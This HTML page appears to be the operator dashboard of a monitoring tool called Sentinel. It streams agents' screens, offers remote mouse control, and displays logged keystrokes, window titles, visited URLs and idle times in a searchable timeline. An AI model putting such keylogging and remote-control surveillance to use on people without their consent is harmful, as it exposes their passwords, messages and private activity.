<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sentinel</title>
  <style>
    /* ── Reset & theme ───────────────────────────────────────────── */
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --bg:      #0f1117;
      --surface: #1a1d27;
      --border:  #2a2d3a;
      --accent:  #5b8def;
      --danger:  #e05c5c;
      --ok:      #4caf78;
      --text:    #d4d8f0;
      --muted:   #6b7090;
      --radius:  6px;
      font-family: 'Segoe UI', system-ui, sans-serif;
      font-size: 14px;
    }
    body { background: var(--bg); color: var(--text); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }

    /* ── Topbar ──────────────────────────────────────────────────── */
    header { display: flex; align-items: center; gap: 12px; padding: 0 16px; height: 50px; background: var(--surface); border-bottom: 1px solid var(--border); flex-shrink: 0; }
    header h1 { font-size: 15px; font-weight: 600; letter-spacing: .5px; }
    #wsStatus { margin-left: auto; display: flex; align-items: center; gap: 6px; font-size: 12px; color: var(--muted); }
    .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); }
    .dot.on { background: var(--ok); }

    /* ── Layout ──────────────────────────────────────────────────── */
    .layout { display: flex; flex: 1; overflow: hidden; }
    aside { width: 220px; flex-shrink: 0; background: var(--surface); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
    aside h2 { padding: 12px 14px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); border-bottom: 1px solid var(--border); }
    #agentList { flex: 1; overflow-y: auto; }
    .agent-item { padding: 10px 14px; cursor: pointer; border-left: 3px solid transparent; display: flex; flex-direction: column; gap: 3px; }
    .agent-item:hover { background: rgba(255,255,255,.04); }
    .agent-item.active { border-color: var(--accent); background: rgba(91,141,239,.08); }
    .agent-item .a-name { font-weight: 500; font-size: 13px; }
    .agent-item .a-meta { font-size: 11px; color: var(--muted); }
    .agent-item .a-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--ok); display: inline-block; margin-right: 5px; vertical-align: middle; }

    /* ── Main area ───────────────────────────────────────────────── */
    main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
    .tabs { display: flex; background: var(--surface); border-bottom: 1px solid var(--border); flex-shrink: 0; }
    .tab { padding: 10px 18px; cursor: pointer; font-size: 13px; color: var(--muted); border-bottom: 2px solid transparent; user-select: none; }
    .tab.active { color: var(--text); border-color: var(--accent); }
    .tab-content { display: none; flex: 1; overflow: auto; padding: 16px; }
    .tab-content.active { display: flex; flex-direction: column; gap: 12px; }

    /* ── Panel ───────────────────────────────────────────────────── */
    .panel { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius); padding: 14px; }
    .panel-title { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--muted); margin-bottom: 10px; }
    .no-agent { color: var(--muted); padding: 40px 0; text-align: center; }

    /* ── Tables ──────────────────────────────────────────────────── */
    table { width: 100%; border-collapse: collapse; font-size: 12px; }
    th, td { padding: 6px 10px; text-align: left; border-bottom: 1px solid var(--border); }
    th { color: var(--muted); font-size: 11px; text-transform: uppercase; }
    tr:last-child td { border-bottom: none; }
    td { max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .tag { display: inline-block; padding: 1px 6px; border-radius: 3px; font-size: 10px; font-weight: 600; }
    .tag-ok     { background: rgba(76,175,120,.15); color: var(--ok); }
    .tag-warn   { background: rgba(224,92,92,.15);  color: var(--danger); }

    /* ── Live feed ───────────────────────────────────────────────── */
    .screen-wrap { display: flex; flex-direction: column; gap: 10px; }
    .screen-toolbar { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
    .screen-toolbar label { display: flex; align-items: center; gap: 6px; cursor: pointer; user-select: none; }
    .screen-toolbar .lbl { font-size: 12px; color: var(--muted); }
    .badge { font-size: 10px; padding: 2px 7px; border-radius: 12px; background: rgba(91,141,239,.2); color: var(--accent); }
    .badge.live { background: rgba(76,175,120,.2); color: var(--ok); animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { opacity:1 } 50% { opacity:.5 } }
    .screen-viewport { position: relative; display: inline-block; max-width: 100%; border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; background: #000; }
    #screenImg { display: block; max-width: 100%; height: auto; }
    #screenCanvas {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      cursor: crosshair; display: none;
      /* prevent right-click context menu showing as a browser native */
    }
    #screenCanvas.active { display: block; }
    #noStream { padding: 60px 24px; color: var(--muted); text-align: center; }

    /* ── Key log ─────────────────────────────────────────────────── */
    .keylog { font-family: 'Cascadia Code', 'Consolas', monospace; font-size: 13px; background: #0d1117; border: 1px solid var(--border); border-radius: var(--radius); padding: 12px; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; }

    /* ── Scrollbars ──────────────────────────────────────────────── */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
  </style>
</head>
<body>

<!-- ── Top bar ──────────────────────────────────────────────────────────── -->
<header>
  <h1>🛡 Sentinel</h1>
  <div id="wsStatus"><div class="dot" id="statusDot"></div><span id="statusTxt">Connecting…</span></div>
</header>

<div class="layout">
  <!-- ── Sidebar ────────────────────────────────────────────────────────── -->
  <aside>
    <h2>Agents</h2>
    <div id="agentList"></div>
  </aside>

  <!-- ── Main ──────────────────────────────────────────────────────────── -->
  <main>
    <div class="tabs">
      <div class="tab active" data-tab="screen">Screen</div>
      <div class="tab" data-tab="keys">Keys</div>
      <div class="tab" data-tab="windows">Windows</div>
      <div class="tab" data-tab="urls">URLs</div>
      <div class="tab" data-tab="activity">Activity</div>
    </div>

    <div class="tab-content active" id="tab-screen">
      <div id="screen-inner"></div>
    </div>
    <div class="tab-content" id="tab-keys">
      <div id="keys-inner"></div>
    </div>
    <div class="tab-content" id="tab-windows">
      <div id="windows-inner"></div>
    </div>
    <div class="tab-content" id="tab-urls">
      <div id="urls-inner"></div>
    </div>
    <div class="tab-content" id="tab-activity">
      <div id="activity-inner"></div>
    </div>
  </main>
</div>

<script>
// ───────────────────────────────────────────────────────────────────────────
// State
// ───────────────────────────────────────────────────────────────────────────
const S = {
  ws:            null,
  agents:        {},        // id → { id, name, online, connected_at, last_connected_at, last_disconnected_at, last_seen }
  activeAgent:   null,      // uuid string
  activeTab:     'screen',
  remoteEnabled: false,
  live:          false,     // whether MJPEG stream is active
  snapTimer:     null,      // interval id for snapshot polling
  mouseThrottle: 0,         // timestamp of last mousemove sent
};

// ───────────────────────────────────────────────────────────────────────────
// Utilities
// ───────────────────────────────────────────────────────────────────────────
const byId  = id => document.getElementById(id);
const esc   = s  => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
const ts    = s  => s ? new Date(s).toLocaleTimeString() : '—';

// ───────────────────────────────────────────────────────────────────────────
// WebSocket
// ───────────────────────────────────────────────────────────────────────────
function connect() {
  const url = `ws://${location.host}/ws/view`;
  S.ws = new WebSocket(url);

  S.ws.onopen = () => {
    byId('statusDot').classList.add('on');
    byId('statusTxt').textContent = 'Connected';
  };

  S.ws.onclose = () => {
    byId('statusDot').classList.remove('on');
    byId('statusTxt').textContent = 'Disconnected — retrying…';
    setTimeout(connect, 3000);
  };

  S.ws.onmessage = e => {
    try { handleEvent(JSON.parse(e.data)); } catch {}
  };
}

// ───────────────────────────────────────────────────────────────────────────
// Event dispatching
// ───────────────────────────────────────────────────────────────────────────
function handleEvent(ev) {
  switch (ev.event) {
    case 'init':
      ev.agents.forEach(a => { S.agents[a.id] = a; });
      renderSidebar();
      break;

    case 'agent_connected':
      S.agents[ev.agent_id] = {
        ...(S.agents[ev.agent_id] || { id: ev.agent_id, name: ev.name }),
        id: ev.agent_id,
        name: ev.name,
        online: true,
        connected_at: ev.connected_at || new Date().toISOString(),
        last_connected_at: ev.connected_at || new Date().toISOString(),
      };
      renderSidebar();
      break;

    case 'agent_disconnected':
      if (S.agents[ev.agent_id]) {
        S.agents[ev.agent_id].online = false;
        S.agents[ev.agent_id].connected_at = null;
        S.agents[ev.agent_id].last_disconnected_at = ev.disconnected_at || new Date().toISOString();
      }
      renderSidebar();
      if (S.activeAgent === ev.agent_id) stopMjpeg();
      break;

    case 'window_focus':
      if (S.activeAgent === ev.agent_id && S.activeTab === 'windows') refreshWindows();
      break;

    case 'keys':
      if (S.activeAgent === ev.agent_id && S.activeTab === 'keys') refreshKeys();
      break;

    case 'url':
      if (S.activeAgent === ev.agent_id && S.activeTab === 'urls') refreshUrls();
      break;

    case 'afk': case 'active':
      if (S.activeAgent === ev.agent_id && S.activeTab === 'activity') refreshActivity();
      break;
  }
}

// ───────────────────────────────────────────────────────────────────────────
// Sidebar
// ───────────────────────────────────────────────────────────────────────────
function renderSidebar() {
  const list = byId('agentList');
  list.innerHTML = '';
  const agents = Object.values(S.agents).sort((a,b) => {
    const ta = a.online ? (a.connected_at || a.last_seen || a.last_connected_at || '') : (a.last_seen || a.last_disconnected_at || a.last_connected_at || '');
    const tb = b.online ? (b.connected_at || b.last_seen || b.last_connected_at || '') : (b.last_seen || b.last_disconnected_at || b.last_connected_at || '');
    return String(tb).localeCompare(String(ta));
  });

  agents.forEach(a => {
    const el = document.createElement('div');
    el.className = 'agent-item' + (a.id === S.activeAgent ? ' active' : '');
    const dot = `<span class="a-dot" style="background:${a.online ? 'var(--ok)' : 'var(--danger)'}"></span>`;
    const meta = a.online
      ? `Online • since ${ts(a.connected_at)}`
      : `Offline • last ${ts(a.last_disconnected_at || a.last_seen || a.last_connected_at)}`;
    el.innerHTML = `<span class="a-name">${dot}${esc(a.name)}</span>
                    <span class="a-meta">${meta}</span>`;
    el.onclick = () => selectAgent(a.id);
    list.appendChild(el);
  });
  if (!Object.keys(S.agents).length) {
    list.innerHTML = '<div style="padding:16px;color:var(--muted);font-size:12px">No agents yet</div>';
  }
}

function selectAgent(id) {
  if (S.activeAgent === id) return;
  stopLive();
  S.activeAgent = id;
  S.remoteEnabled = false;
  S.live = false;
  renderSidebar();
  renderActiveTab();
}

// ───────────────────────────────────────────────────────────────────────────
// Tab switching
// ───────────────────────────────────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(t => {
  t.addEventListener('click', () => {
    const tab = t.dataset.tab;
    if (tab === S.activeTab) return;
    if (S.activeTab === 'screen') stopLive();
    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
    t.classList.add('active');
    byId('tab-' + tab).classList.add('active');
    S.activeTab = tab;
    renderActiveTab();
  });
});

function renderActiveTab() {
  switch (S.activeTab) {
    case 'screen':   renderScreen();   break;
    case 'keys':     refreshKeys();    break;
    case 'windows':  refreshWindows(); break;
    case 'urls':     refreshUrls();    break;
    case 'activity': refreshActivity(); break;
  }
}

// ───────────────────────────────────────────────────────────────────────────
// Screen tab — MJPEG stream + remote control
// ───────────────────────────────────────────────────────────────────────────
function renderScreen() {
  const wrap = byId('screen-inner');

  if (!S.activeAgent) {
    wrap.innerHTML = '<p class="no-agent">← Select an agent to view its screen</p>';
    return;
  }

  wrap.innerHTML = `
    <div class="screen-wrap">
      <div class="screen-toolbar">
        <span class="badge ${S.live ? 'live' : ''}" id="streamBadge">${S.live ? '● LIVE' : '● IDLE'}</span>
        <button id="liveBtn" class="badge" style="border:1px solid var(--border);background:rgba(255,255,255,.04);cursor:pointer">
          ${S.live ? 'Stop' : 'Go live'}
        </button>
        <label>
          <input type="checkbox" id="remoteToggle" ${S.remoteEnabled ? 'checked' : ''}>
          <span class="lbl">Remote control</span>
        </label>
        <span class="lbl" id="coordLabel" style="margin-left:auto"></span>
      </div>
      <div class="screen-viewport" id="screenViewport">
        <img id="screenImg" alt="${S.live ? 'Live stream' : 'Latest screenshot'}">
        <canvas id="screenCanvas"></canvas>
      </div>
    </div>`;

  const liveBtn = byId('liveBtn');
  liveBtn.onclick = () => {
    if (S.live) {
      stopLive();
      S.live = false;
      S.remoteEnabled = false;
      renderScreen();
    } else {
      S.live = true;
      startLive();
      renderScreen();
    }
  };

  // Remote-control toggle
  const toggle = byId('remoteToggle');
  toggle.onchange = () => {
    S.remoteEnabled = toggle.checked;
    applyRemoteState();
  };
  applyRemoteState();

  // Default to lightweight snapshots until the user explicitly goes live.
  if (!S.live) startSnapshots();
}

function applyRemoteState() {
  const canvas = byId('screenCanvas');
  if (!canvas) return;
  // Remote control only makes sense when we have a live stream.
  if (S.remoteEnabled && S.live) {
    canvas.classList.add('active');
    attachCanvasEvents(canvas);
  } else {
    canvas.classList.remove('active');
  }
}

function startSnapshots() {
  stopSnapshots();
  const tick = () => {
    const img = byId('screenImg');
    if (!img || !S.activeAgent || S.live) return;
    img.src = `/api/agents/${S.activeAgent}/screen?ts=${Date.now()}`;
  };
  tick();
  S.snapTimer = setInterval(tick, 1500);
}

function stopSnapshots() {
  if (S.snapTimer) {
    clearInterval(S.snapTimer);
    S.snapTimer = null;
  }
}

function startLive() {
  stopSnapshots();
  const img = byId('screenImg');
  if (img && S.activeAgent) {
    img.src = `/api/agents/${S.activeAgent}/mjpeg?ts=${Date.now()}`;
  }
}

// Hard-stop the MJPEG stream by removing the <img> node so the HTTP connection closes immediately.
function stopLive() {
  stopSnapshots();
  const img = byId('screenImg');
  if (img) {
    const parent = img.parentNode;
    img.remove();
    if (parent) {
      const repl = document.createElement('img');
      repl.id = 'screenImg';
      repl.alt = 'Latest screenshot';
      parent.insertBefore(repl, parent.firstChild);
    }
  }
}

// Attach mouse event listeners to the remote-control canvas.
function attachCanvasEvents(canvas) {
  // Prevent duplicate handlers.
  canvas.onmousemove = null;
  canvas.onclick     = null;
  canvas.oncontextmenu = null;

  canvas.onmousemove = e => {
    const now = Date.now();
    if (now - S.mouseThrottle < 50) return; // max 20 events/s
    S.mouseThrottle = now;
    const [x, y] = canvasToScreen(canvas, e);
    sendControl({ type: 'MouseMove', x, y });
    byId('coordLabel').textContent = `${x}, ${y}`;
  };

  canvas.onclick = e => {
    const [x, y] = canvasToScreen(canvas, e);
    sendControl({ type: 'MouseClick', x, y, button: 'Left' });
  };

  canvas.oncontextmenu = e => {
    e.preventDefault();
    const [x, y] = canvasToScreen(canvas, e);
    sendControl({ type: 'MouseClick', x, y, button: 'Right' });
  };
}

/**
 * Map a mouse event on the <canvas> element back to native screen
 * co-ordinates using the underlying MJPEG image's natural dimensions.
 */
function canvasToScreen(canvas, e) {
  const rect = canvas.getBoundingClientRect();
  const img  = byId('screenImg');

  const nw = img && img.naturalWidth  ? img.naturalWidth  : rect.width;
  const nh = img && img.naturalHeight ? img.naturalHeight : rect.height;

  const x = Math.round((e.clientX - rect.left) / rect.width  * nw);
  const y = Math.round((e.clientY - rect.top)  / rect.height * nh);
  return [x, y];
}

/** Send a control command to the selected agent via the viewer WebSocket. */
function sendControl(cmd) {
  if (!S.ws || S.ws.readyState !== WebSocket.OPEN) return;
  if (!S.activeAgent) return;
  S.ws.send(JSON.stringify({ type: 'control', agent_id: S.activeAgent, cmd }));
}

// ───────────────────────────────────────────────────────────────────────────
// Keys tab
// ───────────────────────────────────────────────────────────────────────────
async function refreshKeys() {
  const el = byId('keys-inner');
  if (!S.activeAgent) { el.innerHTML = noAgent(); return; }

  const data = await apiFetch(`/api/agents/${S.activeAgent}/keys`);
  if (!data) return;

  if (!data.rows.length) { el.innerHTML = empty('No keystroke sessions recorded'); return; }

  el.innerHTML = `
    <div class="panel">
      <div class="panel-title">Keystroke sessions</div>
      <table>
        <thead><tr><th>App</th><th>Window</th><th>Text</th><th>Started</th><th>Updated</th></tr></thead>
        <tbody>
          ${data.rows.map(r => `
            <tr>
              <td>${esc(r.app)}</td>
              <td>${esc(r.window_title)}</td>
              <td class="keylog" style="max-width:280px">${esc(r.text)}</td>
              <td>${ts(r.started_at)}</td>
              <td>${ts(r.updated_at)}</td>
            </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
}

// ───────────────────────────────────────────────────────────────────────────
// Windows tab
// ───────────────────────────────────────────────────────────────────────────
async function refreshWindows() {
  const el = byId('windows-inner');
  if (!S.activeAgent) { el.innerHTML = noAgent(); return; }

  const data = await apiFetch(`/api/agents/${S.activeAgent}/windows`);
  if (!data) return;

  if (!data.rows.length) { el.innerHTML = empty('No window events recorded'); return; }

  el.innerHTML = `
    <div class="panel">
      <div class="panel-title">Window focus history</div>
      <table>
        <thead><tr><th>Title</th><th>App</th><th>Time</th></tr></thead>
        <tbody>
          ${data.rows.map(r => `
            <tr>
              <td>${esc(r.title)}</td>
              <td>${esc(r.app)}</td>
              <td>${ts(r.ts)}</td>
            </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
}

// ───────────────────────────────────────────────────────────────────────────
// URLs tab
// ───────────────────────────────────────────────────────────────────────────
async function refreshUrls() {
  const el = byId('urls-inner');
  if (!S.activeAgent) { el.innerHTML = noAgent(); return; }

  const data = await apiFetch(`/api/agents/${S.activeAgent}/urls`);
  if (!data) return;

  if (!data.rows.length) { el.innerHTML = empty('No URL visits recorded'); return; }

  el.innerHTML = `
    <div class="panel">
      <div class="panel-title">URL visits</div>
      <table>
        <thead><tr><th>URL</th><th>Browser</th><th>Time</th></tr></thead>
        <tbody>
          ${data.rows.map(r => `
            <tr>
              <td><a href="${esc(r.url)}" target="_blank" style="color:var(--accent)">${esc(r.url)}</a></td>
              <td>${esc(r.browser)}</td>
              <td>${ts(r.ts)}</td>
            </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
}

// ───────────────────────────────────────────────────────────────────────────
// Activity tab
// ───────────────────────────────────────────────────────────────────────────
async function refreshActivity() {
  const el = byId('activity-inner');
  if (!S.activeAgent) { el.innerHTML = noAgent(); return; }

  // Build a smarter "timeline" by merging recent windows + urls + key sessions,
  // then grouping into app sessions (Chrome becomes one session with nested tabs/urls/keys).
  const [windows, urls, keys, activity] = await Promise.all([
    apiFetch(`/api/agents/${S.activeAgent}/windows?limit=250`),
    apiFetch(`/api/agents/${S.activeAgent}/urls?limit=250`),
    apiFetch(`/api/agents/${S.activeAgent}/keys?limit=100`),
    apiFetch(`/api/agents/${S.activeAgent}/activity?limit=200`),
  ]);
  if (!windows || !urls || !keys || !activity) return;

  const normApp = (s) => {
    const v = (s || '').trim();
    if (!v) return 'unknown';
    const low = v.toLowerCase();
    // If it already looks like a process name, keep it.
    if (low.endsWith('.exe')) return low;
    // Common browser/product strings seen in URL events → map to the process we log for window/keys.
    // (On your machine Helium browser shows up as chrome.exe in window/key events.)
    if (low.includes('helium')) return 'chrome.exe';
    if (low.includes('chrome')) return 'chrome.exe';
    if (low.includes('edge')) return 'msedge.exe';
    if (low.includes('firefox')) return 'firefox.exe';
    return v;
  };

  const events = [];
  (windows.rows || []).forEach(r => events.push({ kind:'window', ts:r.ts, app:normApp(r.app), title:r.title || '' , data:r }));
  (urls.rows || []).forEach(r => events.push({
    kind:'url',
    ts:r.ts,
    app:normApp(r.browser || r.title),
    title:r.title || '',
    data:r
  }));
  (keys.rows || []).forEach(r => events.push({ kind:'keys', ts:r.updated_at || r.started_at, app:normApp(r.app), title:r.window_title || '' , data:r }));
  (activity.rows || []).forEach(r => events.push({ kind:'activity', ts:r.ts, app:'system', title:r.event_type , data:r }));

  // Sort ascending so sessions read like a timeline.
  events.sort((a,b) => new Date(a.ts).getTime() - new Date(b.ts).getTime());

  const gapMs = 2 * 60 * 1000;
  const sessions = [];
  let cur = null;
  for (const ev of events) {
    const t = new Date(ev.ts).getTime();
    const shouldNew =
      !cur ||
      cur.app !== ev.app ||
      (t - cur.lastTs) > gapMs;
    if (shouldNew) {
      cur = { app: ev.app, startTs: t, lastTs: t, items: [] };
      sessions.push(cur);
    }
    cur.lastTs = t;
    cur.items.push(ev);
  }

  const q = (S.activityQuery || '').trim().toLowerCase();
  const filtered = q ? sessions.filter(s => {
    const hay = [
      s.app,
      ...s.items.map(i => i.title || ''),
      ...s.items.map(i => (i.kind === 'url' ? (i.data.url || '') : '')),
      ...s.items.map(i => (i.kind === 'keys' ? (i.data.text || '') : '')),
    ].join('\n').toLowerCase();
    return hay.includes(q);
  }) : sessions;

  el.innerHTML = `
    <div class="panel">
      <div class="panel-title">Timeline</div>
      <div style="display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap">
        <input id="activitySearch" placeholder="Search app / URLs / keys…" value="${esc(S.activityQuery || '')}"
               style="flex:1;min-width:240px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:6px;padding:8px 10px;color:var(--text)">
        <span style="color:var(--muted);font-size:12px">${filtered.length} sessions</span>
      </div>
      <div style="display:flex;flex-direction:column;gap:10px">
        ${filtered.map(s => renderSession(s)).join('')}
      </div>
    </div>`;

  byId('activitySearch').oninput = (e) => {
    S.activityQuery = e.target.value;
    refreshActivity();
  };
}

function renderSession(s) {
  const start = new Date(s.startTs).toLocaleTimeString();
  const end = new Date(s.lastTs).toLocaleTimeString();
  const head = `<div style="display:flex;justify-content:space-between;gap:10px;align-items:center">
      <div style="font-weight:600">${esc(s.app)}</div>
      <div style="color:var(--muted);font-size:12px">${start} → ${end}</div>
    </div>`;

  const items = s.items.map(ev => {
    if (ev.kind === 'url') {
      return `<div style="color:var(--muted);font-size:12px;line-height:1.35">
        <span class="tag tag-ok">URL</span>
        <a href="${esc(ev.data.url)}" target="_blank" style="color:var(--accent);text-decoration:none">${esc(ev.data.url)}</a>
        ${ev.title ? `<span style="color:var(--muted)"> — ${esc(ev.title)}</span>` : ''}
      </div>`;
    }
    if (ev.kind === 'window') {
      return `<div style="color:var(--muted);font-size:12px;line-height:1.35">
        <span class="tag">WIN</span> ${esc(ev.title || '(no title)')}
      </div>`;
    }
    if (ev.kind === 'keys') {
      const txt = (ev.data.text || '').slice(-280);
      return `<div style="color:var(--muted);font-size:12px;line-height:1.35">
        <span class="tag">KEYS</span> <span style="font-family:Consolas,monospace;color:var(--text)">${esc(txt)}</span>
      </div>`;
    }
    // activity (afk/active)
    return `<div style="color:var(--muted);font-size:12px;line-height:1.35">
      <span class="tag ${ev.data.event_type === 'active' ? 'tag-ok' : 'tag-warn'}">${esc(ev.data.event_type)}</span>
      ${ev.data.idle_secs != null ? `<span style="margin-left:6px">idle ${ev.data.idle_secs}s</span>` : ''}
    </div>`;
  }).join('');

  return `<div style="border:1px solid var(--border);border-radius:8px;padding:12px;background:rgba(255,255,255,.02)">
    ${head}
    <div style="margin-top:8px;display:flex;flex-direction:column;gap:6px">
      ${items}
    </div>
  </div>`;
}

// ───────────────────────────────────────────────────────────────────────────
// Helpers
// ───────────────────────────────────────────────────────────────────────────
async function apiFetch(url) {
  try {
    const r = await fetch(url);
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    return await r.json();
  } catch (e) {
    console.warn('API error', url, e);
    return null;
  }
}

const noAgent = () => '<p class="no-agent">← Select an agent</p>';
const empty   = m  => `<div class="panel"><p style="color:var(--muted);text-align:center;padding:24px">${m}</p></div>`;

// ───────────────────────────────────────────────────────────────────────────
// Boot
// ───────────────────────────────────────────────────────────────────────────
connect();
</script>
</body>
</html>
